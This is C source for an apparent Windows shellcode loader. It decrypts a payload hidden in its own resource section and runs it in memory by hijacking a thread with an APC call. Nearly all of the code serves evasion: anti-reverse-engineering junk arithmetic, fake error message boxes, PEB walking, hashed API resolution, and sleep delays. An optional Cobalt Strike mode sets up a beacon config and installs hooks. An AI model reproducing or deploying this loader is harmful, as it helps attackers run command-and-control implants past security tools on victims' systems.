#include <Windows.h>

#include "Header.h"
#include "Config.h"

#define SIZE_OF_KY_PART 0x10
#define SIZE_OF_PD_PART 0x04

#define SIZE_OF_SEC_HEADER 0x28
#define SIZE_OF_ICN_HEADER 0xFF
#define SIZE_OF_RSRC_TABLE 0xA0


#pragma comment (linker , "/ENTRY:MainEP")


extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)

#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
	unsigned char* p = (unsigned char*)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (unsigned char)value;
	}
	return pTarget;
}



int MainEP() {
	/*
		ANY NUMBER CHANGED HERE 'WILL NOT' RUN THE ENTRY POINT, COMMENTS ARE THE 'MUST TO BE' VALUES, AT LEAST ON THIS CURRENT LOGIC 
	*/
	int I = 7;
	int num0 = 47 * 6 + (20 + I);			//309
	int num1 = 7;
	int num2 = 0;
	int i = -1, j = 2, z = 0;

	while (i < 13) {
		num0 += num1;
		num0 = num0 + (num0 / 2) + j;
		num0 = (num0 + 12) * (num1 - 1);
		i++;
		j = i++;
		if (i == 4) {
			i = i + 2;
		}
	}

	num1 += num0 - (num0 / 2) + i + (j * 2);
	num1 -= num0 / 2;					//44
	num2 = num1;

	while (num1 > 0 && num1 % 2 == 0) {
		num1 /= 2;
		z++;
	}

	// num2 =  44
	// num1 =  11
	// z = 2

	switch (num1) {
	case 12:
		MessageBoxA(NULL, "Sorry, Unkown Error Occured", "Error !", MB_OK);
		break;
	case 13:
		MessageBoxA(NULL, "Sorry, Please Install The Software Again", "Error !", MB_OK);
		break;
	case 14:
		MessageBoxA(NULL, "Sorry, Some Libraries Are Missing", "Error !", MB_OK);
		break;
	case 15:
		MessageBoxW(NULL, L"Sorry, Error A823, For More Details, Check Our Website", L"Error !", MB_OK);
		break;
	case 16:
		MessageBoxW(NULL, L"Sorry, Error B281, For More Details, Check Our Website", L"Error !", MB_OK);
		break;
	case 17:
		MessageBoxW(NULL, L"Sorry, Error C491, For More Details, Check Our Website", L"Error !", MB_OK);
		break;
	default:
		break;
	}


	if (num1 * z == num2 / 2) {
		return main();
	}


	// ALTHOUGH TRUE, BUT WILL NEVER HIT [FUCKING WITH RE]
	if (num1 * z == 22) {
		HANDLE H = NULL;
		CONSOLE_FONT_INFO F = { 0 };
		SMALL_RECT CW = { 0,0, 23, 453 };
		COORD C = { 0, 0 };
		DWORD D = NULL;
		PVOID M = NULL;
		CONSOLE_HISTORY_INFO CHI;
		/*
			the following api's are not black listed : [ 0 BLACKLISTED API'S IMPORTED ]  
		*/
		H = GetStdHandle(STD_ERROR_HANDLE);
		if (!IsWindowEnabled(NULL)) {
			return -1;
		}
		GetConsoleHistoryInfo(&CHI);
		if (SetConsoleWindowInfo(H, FALSE, &CW) ||
			!SetConsoleScreenBufferSize(H, C) && (D != NULL) || (F.nFont == NULL) ||
			!WriteConsoleOutputAttribute(H, FOREGROUND_GREEN, 100, C, &D) || SetConsoleMode(H, ENABLE_ECHO_INPUT) |
			WriteConsoleOutputCharacterA(H, "This Is A Good Day, Today, Tomorrow, Last Sunday ?", 100, C, &D) && (H != NULL) |
			!ReadConsoleOutputAttribute(H, &D, 100, C, &D)) {
			MessageBeep(MB_OK);
			FormatMessage(
				FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
				NULL,
				GetLastError(),
				MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
				(LPTSTR)&M,
				0,
				NULL
			);
		}
	}
	// ALTHOUGH TRUE, BUT WILL NEVER HIT [FUCKING WITH RE]
	if (num2 / 2 == 22) {
	}

	return 0;
}




#define PRINT( STR, ... )                                                                   \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  


int main(){

    char key[SIZE_OF_KY_PART] = { 0 };
    unsigned char* rawData;
    int* rawDataSize;

    char* TEBPtr = (char*)__readgsqword(0x30);
    char* PEBPtr = *((char**)(TEBPtr + 0x060));
    char* imageBaseAddress = *((char**)(PEBPtr + 0x10));

    PIMAGE_DOS_HEADER DosHdr = (PIMAGE_DOS_HEADER)imageBaseAddress;
    PIMAGE_NT_HEADERS NtHdr = (PIMAGE_NT_HEADERS)(imageBaseAddress + DosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER SectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)NtHdr) + sizeof(IMAGE_NT_HEADERS));

    for (unsigned int i = 1; i <= NtHdr->FileHeader.NumberOfSections; i++) {
        if (Rotr32A((PCHAR)SectionHdr->Name) == rsrc_Rotr32) {
            break;
        }
        SectionHdr = (PIMAGE_SECTION_HEADER)((PBYTE)SectionHdr + SIZE_OF_SEC_HEADER);
    }

    if (SectionHdr == NULL) {
        return -1;
    }

    char* sectionValuePtr = imageBaseAddress + SectionHdr->VirtualAddress + SIZE_OF_RSRC_TABLE;
    rawDataSize = (int*)sectionValuePtr;

	DWORD Debug = *rawDataSize;
	
	PRINT(L"Debug : %d \n", Debug);

    rawData = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *rawDataSize);
    CP2(key, sectionValuePtr + SIZE_OF_PD_PART, SIZE_OF_KY_PART);
    CP2(rawData, sectionValuePtr + SIZE_OF_PD_PART + SIZE_OF_KY_PART, *rawDataSize);
    

	if (!FixAllDlls()) {
		MessageBoxW(NULL, L"Sorry, Error A281, For More Details, Check Our Website", L"Error !", MB_OK);
	}


	SucrificeThread(10000, SLEEPTODO);

    PVOID pAddress = NtAllocateAndSet(key, rawData, (size_t)*rawDataSize);
    if (pAddress == NULL) {
        return -1;
    }


#ifdef COBALTSTRIKEMODE
    if (!InitializeBeaconConfig()){
        return -1;
    }
    InstallHooks(SLEEPHOOK);
    InstallHooks(VIRTUALALLOCHOOK);
#endif // COBALTSTRIKEMODE

    
	HANDLE hThread = LocalApcHijack(pAddress);
	if (hThread == NULL) {
		return -1;
	}
	
	fnNtWaitForSingleObject NtWaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddressF(NTDLLDLL_Rotr32, NtWaitForSingleObject_Rotr32);
	if (!NT_SUCCESS((NtWaitForSingleObject(hThread, FALSE, NULL)))) {
		return NULL;
	}


    return 0;
}

